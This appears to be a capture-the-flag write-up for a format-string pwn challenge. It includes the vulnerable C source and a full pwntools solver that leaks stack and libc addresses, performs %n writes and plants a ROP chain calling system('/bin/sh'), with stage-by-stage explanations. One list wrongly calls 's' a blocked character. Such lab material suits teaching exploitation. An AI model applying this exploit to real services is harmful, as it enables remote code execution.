![[Pasted image 20260407194728.png]]

## FILE & CHECKSEC

![[Pasted image 20260407194955.png]]

## Chall.c

``` c
#include <stdio.h>
#include <stdbool.h>
#include <string.h>

void setup() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
}

int main() {
    setup();
    char name[100];
    while(1) {
        printf("Suggest a new Uma Name: ");
        scanf("%100[^\n]%*c", name);

        if(strcmp(name, "YADA!!") == 0) {
            printf("Bro you are not Sweep Tosho!\n");
            break;
        }

        bool is_valid = true;
        for(int i = 0; i < strlen(name); i++) {
            if(strchr("FuSaichi PaNdorA", name[i]) != NULL) {
                is_valid = false;
                break;
            } else if(strchr("Gold Ship", name[i]) != NULL) {
                is_valid = false;
                break;
            } else if(strchr("zENNo Rob Roy", name[i]) != NULL) {
                is_valid = false;
                break;
            } else if(strchr("CalStoNe Light O", name[i]) != NULL) {
                is_valid = false;
                break;
            } else if(strchr("Mejiro RamoNu", name[i]) != NULL) {
                is_valid = false;
                break;
            } else if(strchr("VerXxiNa", name[i]) != NULL) {
                is_valid = false;
                break;
            } else if(strchr("iNeS fujiN", name[i]) != NULL) {                
                is_valid = false;
                break;
            }
        }

        if(is_valid) {
            printf(name); printf("! Umazing!\n");
        } else {
            printf("Bruh, Gold Ship can list 1000 easily, but you can't name a single one???\n");
        }
    }
}
```

> [!note]- Explanation
>
> The first important issue appears at the end of the validation logic:
>
> ```c
> if(is_valid) {
>     printf(name);
>     printf("! Umazing!\n");
> }
> ```
>
> Here, `name` is passed directly into `printf()` as the format string.  
> This is the core vulnerability: a **format string vulnerability**.
>
> So if we can pass the filter, our input is not treated as plain text — it is interpreted by `printf()` itself.
>
> ---
>
> Before exploiting that bug, we need to understand the filter.
>
> The program checks each character using several `strchr()` calls:
>
> ```c
> if(strchr("FuSaichi PaNdorA", name[i]) != NULL) ...
> else if(strchr("Gold Ship", name[i]) != NULL) ...
> else if(strchr("zENNo Rob Roy", name[i]) != NULL) ...
> else if(strchr("CalStoNe Light O", name[i]) != NULL) ...
> else if(strchr("Mejiro RamoNu", name[i]) != NULL) ...
> else if(strchr("VerXxiNa", name[i]) != NULL) ...
> else if(strchr("iNeS fujiN", name[i]) != NULL) ...
> ```
>
> This means the program is not blacklisting full words.  
> It is blacklisting **characters**.
>
> If we merge those strings together, the forbidden character set becomes:
>
> ```text
> ' ' A C E F G M N O P R S V X
> a b c d e f h i j l m o p r t u x y z
> ```
>
> So several common format-string characters are blocked from the start, including:
>
> - `c`
> - `d`
> - `e`
> - `f`
> - `i`
> - `o`
> - `p`
> - `r`
> - `s`
> - `u`
> - `x`
>
> This is important because it removes many standard format string payloads such as:
>
> - `%p`
> - `%x`
> - `%c`
>
> However, some useful characters still survive the filter, such as:
>
> - `%`
> - digits (`0-9`)
> - `$`
> - `n`
>
> So even under the blacklist, payloads like these are still possible:
>
> ```text
> %9$n
> %24$n
> ```
>
> In short, the challenge gives us a **format string vulnerability**, but under a **restricted character set**, so the exploit must use only the remaining allowed format-string syntax.
## Strategy Overview

> [!note]- Explanation
>
> Our exploit can be understood in **three phases**:
>
> ### Phase 1 — Leak a stack address
>
> First, we use the format string bug to leak a stack pointer.  
> In the solver, this is done with:
>
> ```python
> STACK_LEAK_FMT = b"%24$s"
> ```
>
> The `%24$s` offset was obtained empirically from the **local stack layout**, typically by checking the stack in GDB/pwndbg and validating which positional argument reaches the value we want.
>
> Once that stack value is leaked, we can compute the location of the saved return address:
>
> ```text
> stack leak -> saved RIP
> ```
>
> ---
>
> ### Phase 2 — Leak libc
>
> After locating the saved return address on the stack, we use the format string again to read memory from that address.
>
> The value stored there points back into libc, so it becomes our libc leak:
>
> ```text
> saved RIP -> libc leak -> libc base
> ```
>
> From that leak, we recover the libc base and resolve all important runtime addresses such as:
>
> - `system`
> - `exit`
> - `"/bin/sh"`
> - useful ROP gadgets like `ret` and `pop rdi`
>
> ---
>
> ### Phase 3 — Overwrite saved RIP with a ROP chain
>
> Finally, we turn the format string bug into a write primitive using `%n`.
>
> With the stack target and libc base both known, we overwrite the saved return address with a ROP chain:
>
> ```text
> ret -> pop rdi -> "/bin/sh" -> system -> exit
> ```
>
> So when the function returns, execution follows our forged chain and spawns a shell.
>
> ---
>
> In short, the full exploit flow is:
>
> ```text
> stack leak -> libc leak -> saved RIP overwrite -> ROP -> shell
> ```

## Solve.py

``` python
from pwn import *

exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
context.binary = exe

STACK_LEAK_FMT = b"%24$s"


def start():
    if args.GDB:
        return gdb.debug([exe.path], gdbscript="""
            b *main+579
            c
        """)
    if args.REMOTE:
        return remote(args.HOST or "addr", int(args.PORT or 1337))
    return process([exe.path])


def fsb_read(io, addr):
    payload = b"%9$s\x00AAA" + p64(addr)
    io.sendlineafter(b"Uma Name: ", payload)
    return io.recvuntil(b"!")[:-1]


def leak_stack(io):
    io.sendlineafter(b"Uma Name: ", STACK_LEAK_FMT)
    data = io.recvuntil(b"!")[:-1]
    return u64(data.ljust(8, b"\x00")[:8])


def write_count(io, addr, count):
    count &= 0xFFFFFFFF

    if count == 0:
        fmt = b"%9$n"
    else:
        # %17$s is stable and resolves to NULL on this stack layout, so width
        # padding gives us an exact printed-length primitive without blocked
        # specifiers like %x or %c.
        target_idx = 9
        while True:
            trial = f"%17${count}s%{target_idx}$n".encode()
            first_ptr_off = (len(trial) + 1 + 7) & ~7
            actual_idx = 8 + (first_ptr_off // 8)
            if actual_idx == target_idx:
                fmt = trial
                break
            target_idx = actual_idx

    first_ptr_off = (len(fmt) + 1 + 7) & ~7
    payload = fmt + b"\x00" + b"A" * (first_ptr_off - len(fmt) - 1) + p64(addr)
    io.sendlineafter(b"Uma Name: ", payload)
    io.recvuntil(b"!")


def write_qword_overlap(io, addr, value, size=6):
    for i in range(size):
        byte = (value >> (8 * i)) & 0xFF
        write_count(io, addr + i, byte)
        log.info("write [%#x] = %#x", addr + i, byte)


def run_once():
    io = start()
    stack_leak = leak_stack(io)
    ret_addr = stack_leak - 0x108

    libc_leak_raw = fsb_read(io, ret_addr)
    libc_leak = u64(libc_leak_raw.ljust(8, b"\x00")[:8])
    libc.address = libc_leak - 0x2A601

    rop_ret = libc.address + 0x289FE
    pop_rdi = libc.address + 0x11BCFA
    bin_sh = libc.address + 0x1DB799
    system = libc.sym["system"]
    exit_fn = libc.sym["exit"]

    log.info("stack leak : %#x", stack_leak)
    log.info("saved rip  : %#x", ret_addr)
    log.info("libc leak  : %#x", libc_leak)
    log.info("libc base  : %#x", libc.address)
    log.info("ret gadget : %#x", rop_ret)
    log.info("pop rdi    : %#x", pop_rdi)
    log.info("/bin/sh    : %#x", bin_sh)
    log.info("system     : %#x", system)

    chain = [
        rop_ret,
        pop_rdi,
        bin_sh,
        system,
        exit_fn,
    ]

    for idx, value in enumerate(chain):
        write_qword_overlap(io, ret_addr + idx * 8, value)

    io.sendlineafter(b"Uma Name: ", b"YADA!!")
    return io


def main():
    attempts = int(args.ATTEMPTS or 5)

    for attempt in range(1, attempts + 1):
        io = None
        try:
            io = run_once()

            if args.CHECK:
                io.recv(timeout=0.2)
                io.sendline(b"echo PWNED")
                if b"PWNED" not in io.recv(timeout=1):
                    raise EOFError("shell probe failed")

            log.success("phase 3 complete on attempt %d", attempt)

            if args.CMD:
                io.recv(timeout=0.2)
                io.sendline(args.CMD.encode())
                data = io.recvall(timeout=2)
                if data:
                    print(data.decode("latin-1", errors="ignore"), end="")
                return

            if not args.INTERACTIVE:
                return

            io.interactive()
            return
        except Exception as exc:
            log.warning("attempt %d/%d failed: %s", attempt, attempts, exc)
            if io is not None:
                try:
                    io.close()
                except Exception:
                    pass

    raise SystemExit("phase 3 failed after all attempts")


if __name__ == "__main__":
    main()

```

> [!note]- Stage 1 — Leaking a Stack Address
>
> ```python
> STACK_LEAK_FMT = b"%24$s"
>
> def leak_stack(io):
>     io.sendlineafter(b"Uma Name: ", STACK_LEAK_FMT)
>     data = io.recvuntil(b"!")[:-1]
>     return u64(data.ljust(8, b"\x00")[:8])
> ```
>
> The first goal is to get a reliable stack leak.
>
> We do that with:
>
> ```python
> %24$s
> ```
>
> This offset was obtained empirically from the local stack layout, typically by checking the stack in GDB/pwndbg and validating which positional argument gives a useful leak.
>
> Once that works, we recover a stack value that later becomes our anchor for finding the saved return address.

> [!note]- Stage 2 — Finding the Saved Return Address
>
> ```python
> stack_leak = leak_stack(io)
> ret_addr = stack_leak - 0x108
> ```
>
> After leaking a stack pointer, the next step is to locate the saved RIP.
>
> The solver uses:
>
> ```python
> ret_addr = stack_leak - 0x108
> ```
>
> The `0x108` offset is not guessed from source alone.  
> It comes from local debugging: after identifying the leaked stack value, we inspect the nearby stack frame in GDB/pwndbg and measure the distance to the saved return address.
>
> So at this point, we have:
>
> ```text
> leaked stack pointer -> saved RIP location
> ```

> [!note]- Stage 3 — Building an Arbitrary Read Primitive
>
> ```python
> def fsb_read(io, addr):
>     payload = b"%9$s\x00AAA" + p64(addr)
>     io.sendlineafter(b"Uma Name: ", payload)
>     return io.recvuntil(b"!")[:-1]
> ```
>
> This helper turns the format string bug into an arbitrary read.
>
> The key payload is:
>
> ```python
> b"%9$s\x00AAA" + p64(addr)
> ```
>
> Here:
>
> - `%9$s` tells `printf` to treat the 9th argument as a pointer
> - `p64(addr)` is the address we want `printf` to dereference
>
> So if we can place `p64(addr)` at the correct stack slot, `%9$s` will read memory from that address for us.

> [!note]- Why `b"%9$s\x00AAA" + p64(addr)` Works
>
> ```python
> payload = b"%9$s\x00AAA" + p64(addr)
> ```
>
> This works because the filter uses:
>
> ```c
> strlen(name)
> ```
>
> and `strlen()` stops at the first null byte.
>
> So the buffer effectively looks like this:
>
> ```text
> [ % ][ 9 ][ $ ][ s ][ \x00 ][ A ][ A ][ A ][ p64(addr) ... ]
> ```
>
> Then the behavior splits into two parts:
>
> ### What the filter sees
>
> The validation loop only checks bytes before the first `\x00`, so it effectively sees:
>
> ```text
> %9$s
> ```
>
> and ignores everything after that.
>
> ### What `printf` sees
>
> `printf` also stops parsing the format string at `\x00`, so it only interprets:
>
> ```text
> %9$s
> ```
>
> But the bytes after `\x00` are still present in memory, and we padded them so that:
>
> ```python
> p64(addr)
> ```
>
> lands exactly where `%9$s` expects its 9th argument.
>
> So the mechanism is:
>
> - the visible format string is short and passes the filter
> - the raw pointer is smuggled after `\x00`
> - `%9$s` later uses that pointer as an argument
>
> This is why the `strlen(name)` behavior is such an important enabler for the exploit.

> [!note]- Stage 4 — Leaking Libc from Saved RIP
>
> ```python
> libc_leak_raw = fsb_read(io, ret_addr)
> libc_leak = u64(libc_leak_raw.ljust(8, b"\x00")[:8])
> libc.address = libc_leak - 0x2A601
> ```
>
> Once we know the saved return address location, we use the arbitrary-read helper on it:
>
> ```python
> fsb_read(io, ret_addr)
> ```
>
> The value stored at that saved RIP points back into libc, so it becomes our libc leak.
>
> Then we compute:
>
> ```python
> libc.address = libc_leak - 0x2A601
> ```
>
> The `0x2A601` offset was again obtained from local analysis using the provided libc.  
> It is the distance between the leaked return target and the libc base.
>
> After this step, we can resolve all runtime addresses we need.

> [!note]- Stage 5 — Preparing the ROP Chain
>
> ```python
> rop_ret = libc.address + 0x289FE
> pop_rdi = libc.address + 0x11BCFA
> bin_sh = libc.address + 0x1DB799
> system = libc.sym["system"]
> exit_fn = libc.sym["exit"]
> ```
>
> After recovering the libc base, we resolve the gadgets and symbols needed for code execution:
>
> - `ret` for stack alignment
> - `pop rdi` to control the first argument
> - `"/bin/sh"` as the command string
> - `system`
> - `exit`
>
> The final chain is:
>
> ```text
> ret -> pop rdi -> "/bin/sh" -> system -> exit
> ```
>
> So once we can overwrite the saved RIP, we already know exactly what we want to place there.

> [!note]- Stage 6 — Building a `%n` Write Primitive
>
> ```python
> def write_count(io, addr, count):
>     count &= 0xFFFFFFFF
>
>     if count == 0:
>         fmt = b"%9$n"
>     else:
>         target_idx = 9
>         while True:
>             trial = f"%17${count}s%{target_idx}$n".encode()
>             first_ptr_off = (len(trial) + 1 + 7) & ~7
>             actual_idx = 8 + (first_ptr_off // 8)
>             if actual_idx == target_idx:
>                 fmt = trial
>                 break
>             target_idx = actual_idx
>
>     first_ptr_off = (len(fmt) + 1 + 7) & ~7
>     payload = fmt + b"\x00" + b"A" * (first_ptr_off - len(fmt) - 1) + p64(addr)
> ```
>
> Now we turn the format string into a write primitive using `%n`.
>
> The important idea is that `%n` writes:
>
> ```text
> number of characters printed so far
> ```
>
> into the target address.
>
> So `write_count()` is designed to print exactly `count` characters first, then use `%n` to write that value into `addr`.
>
> This gives us a controlled byte-sized write primitive that we can reuse many times.

> [!note]- Why the `%n` Payload Looks Weird
>
> ```python
> trial = f"%17${count}s%{target_idx}$n".encode()
> ```
>
> A normal format string exploit often relies on specifiers like `%x` or `%c` for padding, but those characters are blocked by the blacklist in this challenge.
>
> So the solver uses:
>
> ```python
> %17${count}s
> ```
>
> as a padding trick.
>
> The idea is to force `printf` to produce an exact printed length without relying on blocked specifiers.  
> Then `%{target_idx}$n` writes that final count into the target address.
>
> The loop is there because the payload length itself changes the stack alignment, so the correct positional index for the target pointer must be recalculated until it matches.
>
> In short:
>
> - we need exact output length control
> - the usual specifiers are restricted
> - so the payload self-adjusts until the target pointer lands in the correct argument slot

> [!note]- Stage 7 — Writing the ROP Chain Byte by Byte
>
> ```python
> def write_qword_overlap(io, addr, value, size=6):
>     for i in range(size):
>         byte = (value >> (8 * i)) & 0xFF
>         write_count(io, addr + i, byte)
> ```
>
> This helper writes one target value byte by byte.
>
> For each byte:
>
> - extract the low byte from the intended qword
> - call `write_count()` on `addr + i`
> - write that byte value into memory
>
> So instead of trying to write a full 8-byte address at once, the solver performs several smaller `%n`-based writes.
>
> This is much more manageable under the format-string restrictions.

> [!note]- Stage 8 — Overwriting Saved RIP with the Full Chain
>
> ```python
> chain = [
>     rop_ret,
>     pop_rdi,
>     bin_sh,
>     system,
>     exit_fn,
> ]
>
> for idx, value in enumerate(chain):
>     write_qword_overlap(io, ret_addr + idx * 8, value)
> ```
>
> Once the ROP chain is prepared, the solver writes it directly onto the stack starting at:
>
> ```python
> ret_addr
> ```
>
> Each entry of the chain is written into the next 8-byte slot:
>
> - saved RIP
> - next return slot
> - next return slot
> - and so on
>
> So by the time this loop finishes, the original return path has been fully replaced with our libc ROP chain.

> [!note]- Stage 9 — Triggering the Return
>
> ```python
> io.sendlineafter(b"Uma Name: ", b"YADA!!")
> ```
>
> Finally, the solver sends:
>
> ```text
> YADA!!
> ```
>
> which triggers the program's exit path.
>
> At that point, control eventually returns through the saved RIP we already overwrote, so execution follows our forged chain instead of the normal one.
>
> The result is:
>
> ```text
> system("/bin/sh")
> ```
>
> and we get a shell.

> [!note]- Final Recap
>
> The exploit flow is:
>
> ```text
> %24$s -> leak stack
> stack leak - 0x108 -> saved RIP
> %9$s + smuggled pointer -> arbitrary read
> saved RIP read -> libc leak
> libc leak - 0x2A601 -> libc base
> %n-based writes -> overwrite saved RIP
> ret -> pop rdi -> "/bin/sh" -> system -> exit
> ```
>
> So the whole exploit is built from two format-string primitives:
>
> - **read** with `%s`
> - **write** with `%n`
>
> and both become possible because the `strlen(name)`-based filter can be bypassed with a null-byte-shaped payload.
## FLAG

![[Pasted image 20260407194633.png]]



DUMP

![[Pasted image 20260408140216.png]]

libc base


![[Pasted image 20260408142028.png]]

![[Pasted image 20260408142533.png]]
